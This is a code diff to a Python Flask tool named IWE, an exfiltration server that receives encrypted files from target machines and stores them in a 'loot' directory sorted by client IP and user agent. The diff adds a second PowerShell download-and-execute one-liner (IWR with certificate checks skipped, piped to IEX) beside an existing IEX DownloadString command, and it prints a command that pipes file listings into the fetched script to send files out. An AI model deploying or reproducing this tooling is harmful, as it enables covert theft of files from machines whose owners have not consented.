@@ -1,4 +1,5 @@
 #!/usr/bin/python3
+
 import gzip
 import random
 import string
@@ -16,6 +17,7 @@ from OpenSSL import crypto
 import os
 import shutil
 import binascii
+from datetime import datetime
 
 author = "Philipp Rieth"
 version = "0.2"
@@ -152,7 +154,7 @@ class IWE:
         try:
             with open(os.path.join(__location__, iwe_filename)) as f:
                 self.powershell_iwe_script = f.read()
-        except FileNotFoundError as e:
+        except FileNotFoundError:
             print(f"Error: Could not open '{iwe_filename}'. File not found")
             exit(1)
 
@@ -174,7 +176,7 @@ class IWE:
             cipher = AES.new(self.password_sha256, AES.MODE_CBC, aes_iv)
             plain_text = unpad(cipher.decrypt(aes_cipher_text), AES.block_size)
 
-        except (ValueError, KeyError) as e:
+        except (ValueError, KeyError):
             print("[X] Error: Incorrect decryption. Wrong password? Continuing...")
             raise CouldNotDecryptError
 
@@ -280,13 +282,12 @@ def main():
 
     print(f"URL:      {target_url}\n" 
           f"Password: {args.password}\n"
-          f"Loot dir: {args.targetdir}")
-    print(f"Copy this into your PowerShell:\n"
-          f"PS > IEX (New-Object Net.WebClient).DownloadString('{target_url}iwe')\n")
+          f"Loot dir: {args.targetdir}\n")
+    print(f"Copy any of the two into your PowerShell:\n"
+          f"PS > IEX (New-Object Net.WebClient).DownloadString('{target_url}iwe')\n"
+          f"PS > IWR -SkipCertificateCheck '{target_url}iwe' | IEX \n")
     print("Start exfiltrating files with:\n"
           "PS > ls * | IEX\n")
-
-    print("Ready to receive files...\n")
 
     app = Flask(__name__)
     iwe = IWE(password=args.password)
@@ -303,9 +304,9 @@ def main():
             file_full_path = iwe.aes256_decrypt_filename(content['fn'])
             plaintext_bytes = iwe.aes256_decrypt_binary(content['ct'])
         except CouldNotDecryptError:
-            return Response('Error: Could not decrypt. Wrong password?', status=200)
+            return Response('Error: Received encrypted file but could not decrypt it. Wrong password?', status=200)
         except TypeError:
-            return Response('Error: The received body looks wrong', status=200)
+            return Response('Error: The received JSON body looks wrong', status=200)
 
         dirs = os.path.dirname(file_full_path).replace(':', '')
         filename = os.path.basename(file_full_path)
@@ -313,8 +314,9 @@ def main():
         useragent = ''.join(char for char in request.headers.get('User-Agent') if char not in ';:/\\*?><|')
         useragent = useragent.replace(' ', '_')
         client_ip = request.remote_addr
-        random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
-        client_folder_name = f"{client_ip}_{useragent}_{random_string}"
+        timestamp = datetime.now().strftime("%Y_%m%d_%H.%M.%S")
+
+        client_folder_name = f"{client_ip}_{useragent}_{timestamp}"
 
         os.makedirs(os.path.join(args.targetdir, client_folder_name, dirs), exist_ok=True)
         with open(os.path.join(args.targetdir, client_folder_name, dirs, filename), "wb") as f:
@@ -342,33 +344,24 @@ def main():
 
         return Response(iwe_file, status=200)
 
-    # Run iwe in HTTP if needed
+    # Run iwe in HTTP mode
     if args.http:
         app.run(host='0.0.0.0', port=args.port)
+
+    # run iwe in HTTPS mode
     else:
-        ssl_context = 'adhoc'
-        # ToDo: implement custom cert support
-        # if args.crt and args.key:
-        #   ssl_context = ('local.crt', 'local.key')
-
-        # context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        # context.set_ciphers('ECDHE+AESGCM:!ECDSA')
-
-        # context.get_ciphers()
-
         context.minimum_version = ssl.TLSVersion.TLSv1_2
 
+        # use user supplied certificate
         if args.crt and args.key:
             context.load_cert_chain(certfile=args.crt, keyfile=args.key)
         else:
             cert_gen()
             context.load_cert_chain(certfile=DEFAULT_CERTIFICATE_CRT, keyfile=DEFAULT_CERTIFICATE_KEY)
 
-        #context = ssl.SSLContext()
-
         app.run(host='0.0.0.0', port=args.port, ssl_context=context)
-        # serve(app, host='0.0.0.0', port=args.port, url_scheme='https')
+
 
 if __name__ == "__main__":
     main()
